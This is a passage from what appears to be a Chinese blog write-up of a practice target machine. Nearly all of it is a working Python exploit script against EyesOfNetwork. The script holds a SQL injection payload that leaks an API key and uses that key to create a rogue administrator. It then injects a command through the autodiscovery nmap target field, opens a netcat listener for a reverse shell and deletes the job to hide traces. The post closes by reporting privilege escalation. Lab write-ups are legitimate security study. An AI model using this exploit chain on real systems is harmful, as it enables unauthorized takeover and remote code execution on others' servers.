+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_err</span><span class=p>,</span> <span class=s1>&#39;The host seems patched or unexploitable&#39;</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_warn</span><span class=p>,</span> <span class=s1>&#39;Did you specified http instead of https in the URL ?&#39;</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_warn</span><span class=p>,</span> <span class=s1>&#39;You can check manually the SQLi with the following payload: &#39;</span><span class=p>,</span> <span class=n>txt_bold</span><span class=p>,</span> <span class=s2>&#34;/eonapi/getApiKey?username=&#39; union select sleep(3),0,0,0,0,0,0,0 or &#39;&#34;</span><span class=p>,</span> <span class=n>txt_reset</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>quit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Adding new administrator</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=n>sys</span><span class=o>.</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span> <span class=o>+</span> <span class=s1>&#39;/eonapi/createEonUser?username=admin&amp;apiKey=&#39;</span> <span class=o>+</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;EONAPI_KEY&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;user-agent&#39;</span><span class=p>:</span><span class=n>useragent</span><span class=p>},</span> <span class=n>json</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;user_name&#34;</span><span class=p>:</span><span class=n>new_user</span><span class=p>,</span><span class=s2>&#34;user_group&#34;</span><span class=p>:</span><span class=s2>&#34;admins&#34;</span><span class=p>,</span><span class=s2>&#34;user_password&#34;</span><span class=p>:</span><span class=n>new_pass</span><span class=p>})</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=s1>&#39;result&#39;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()</span><span class=o>.</span><span class=n>keys</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;result&#39;</span><span class=p>][</span><span class=s1>&#39;code&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span> <span class=ow>and</span> <span class=s1>&#39;SUCCESS&#39;</span> <span class=ow>in</span>  <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;result&#39;</span><span class=p>][</span><span class=s1>&#39;description&#39;</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nb>id</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;result&#39;</span><span class=p>][</span><span class=s1>&#39;description&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;ID = &#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;]&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>txt_success</span><span class=p>,</span> <span class=s1>&#39;New user &#39;</span><span class=p>,</span> <span class=n>txt_bold</span><span class=p>,</span> <span class=n>new_user</span><span class=p>,</span> <span class=n>txt_reset</span><span class=p>,</span> <span class=s1>&#39; successfully created. ID:&#39;</span><span class=p>,</span> <span class=n>txt_bold</span><span class=p>,</span>  <span class=nb>id</span><span class=p>,</span> <span class=n>txt_reset</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;result&#39;</span><span class=p>][</span><span class=s1>&#39;code&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39; already exist.&#39;</span> <span class=ow>in</span>  <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;result&#39;</span><span class=p>][</span><span class=s1>&#39;description&#39;</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>txt_warn</span><span class=p>,</span> <span class=s1>&#39;The user &#39;</span><span class=p>,</span> <span class=n>txt_bold</span><span class=p>,</span> <span class=n>new_user</span><span class=p>,</span> <span class=n>txt_reset</span><span class=p>,</span> <span class=s1>&#39; already exists&#39;</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>txt_err</span><span class=p>,</span> <span class=s1>&#39;An error occured while querying the API. Unexpected description message: &#39;</span><span class=p>,</span> <span class=n>txt_bold</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;result&#39;</span><span class=p>][</span><span class=s1>&#39;description&#39;</span><span class=p>],</span> <span class=n>txt_reset</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=n>quit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>txt_err</span><span class=p>,</span> <span class=s1>&#39;An error occured while querying the API. Unepected result code. Description: &#39;</span><span class=p>,</span> <span class=n>txt_bold</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s1>&#39;result&#39;</span><span class=p>][</span><span class=s1>&#39;description&#39;</span><span class=p>],</span> <span class=n>txt_reset</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>quit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_err</span><span class=p>,</span> <span class=s1>&#39;An error occured while querying the API. Missing result value in JSON response or unexpected HTTP status response&#39;</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>quit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Authentication with our new user</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=n>baseurl</span> <span class=o>+</span> <span class=s1>&#39;/login.php&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>auth_data</span> <span class=o>=</span> <span class=s1>&#39;login=&#39;</span> <span class=o>+</span> <span class=n>new_user</span> <span class=o>+</span> <span class=s1>&#39;&amp;mdp=&#39;</span> <span class=o>+</span><span class=n>new_pass</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>auth_req</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;user-agent&#39;</span><span class=p>:</span><span class=n>useragent</span><span class=p>,</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span><span class=s1>&#39;application/x-www-form-urlencoded&#39;</span><span class=p>},</span> <span class=n>data</span><span class=o>=</span><span class=n>auth_data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>auth_req</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=s1>&#39;Set-Cookie&#39;</span> <span class=ow>in</span> <span class=n>auth_req</span><span class=o>.</span><span class=n>headers</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_success</span><span class=p>,</span> <span class=s1>&#39;Successfully authenticated&#39;</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_err</span><span class=p>,</span> <span class=s1>&#39;Error while authenticating. We expect to receive Set-Cookie headers uppon successful authentication&#39;</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>quit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Creating AutoDiscovery job</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=n>baseurl</span> <span class=o>+</span> <span class=s1>&#39;/lilac/autodiscovery.php&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>job_command</span> <span class=o>=</span> <span class=s1>&#39;request=autodiscover&amp;job_name=Internal+discovery&amp;job_description=Internal+EON+discovery+procedure.&amp;nmap_binary=</span><span class=si>%2F</span><span class=s1>usr</span><span class=si>%2F</span><span class=s1>bin</span><span class=si>%2F</span><span class=s1>nmap&amp;default_template=&amp;target%5B2%5D=&#39;</span> <span class=o>+</span> <span class=n>cmd</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;user-agent&#39;</span><span class=p>:</span><span class=n>useragent</span><span class=p>,</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span><span class=s1>&#39;application/x-www-form-urlencoded&#39;</span><span class=p>},</span> <span class=n>cookies</span><span class=o>=</span><span class=n>auth_req</span><span class=o>.</span><span class=n>cookies</span><span class=p>,</span> <span class=n>data</span><span class=o>=</span><span class=n>job_command</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;Starting...&#39;</span><span class=p>)</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>job_id</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>BeautifulSoup</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>content</span><span class=p>,</span> <span class=s2>&#34;html.parser&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=nb>id</span><span class=o>=</span><span class=s2>&#34;completemsg&#34;</span><span class=p>))</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;?id=&#39;</span><span class=p>,</span> <span class=mi>1</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;&amp;amp;rev&#39;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_success</span><span class=p>,</span> <span class=s1>&#39;Discovery job successfully created with ID: &#39;</span><span class=p>,</span> <span class=n>txt_bold</span><span class=p>,</span> <span class=n>job_id</span><span class=p>,</span> <span class=n>txt_reset</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_err</span><span class=p>,</span> <span class=s1>&#39;Error while creating the discovery job&#39;</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>quit</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Launching listener</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>txt_info</span><span class=p>,</span> <span class=s1>&#39;Spawning netcat listener:&#39;</span><span class=p>,</span> <span class=n>txt_bold</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>nc_command</span> <span class=o>=</span> <span class=s1>&#39;/usr/bin/nc -lnvp&#39;</span> <span class=o>+</span> <span class=n>port</span> <span class=o>+</span> <span class=s1>&#39; -s &#39;</span> <span class=o>+</span> <span class=n>ip</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=n>nc_command</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>txt_reset</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Removing job</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=n>baseurl</span> <span class=o>+</span> <span class=s1>&#39;/lilac/autodiscovery.php?id=&#39;</span> <span class=o>+</span> <span class=n>job_id</span> <span class=o>+</span> <span class=s1>&#39;&amp;delete=1&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>verify</span><span class=o>=</span><span class=kc>False</span><span class=p>,</span> <span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;user-agent&#39;</span><span class=p>:</span><span class=n>useragent</span><span class=p>},</span> <span class=n>cookies</span><span class=o>=</span><span class=n>auth_req</span><span class=o>.</span><span class=n>cookies</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s1>&#39;Removed Job&#39;</span><span class=p>)</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_info</span><span class=p>,</span> <span class=s1>&#39;Job &#39;</span><span class=p>,</span> <span class=n>job_id</span><span class=p>,</span> <span class=s1>&#39; removed&#39;</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>txt_err</span><span class=p>,</span> <span class=s1>&#39;Error while removing the job&#39;</span><span class=p>,</span> <span class=n>sep</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>quit</span><span class=p>()</span>
+</span></span></code></pre></div><p>成功提权成功</p><p><figure class=content-figure><img src=https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260227233439496.png alt=image.png loading=lazy decoding=async></figure></p></div><div class=single-tags><a href=/tags/%E9%9D%B6%E6%9C%BA/># 靶机</a></div></article></section><footer class=footer><p>© 2026 1ux4ry</p><p>Built with Hugo. Layout inspired by a minimalist blog feed, restyled for your own voice.</p></footer></div><script src=/js/main.js></script></body></html>
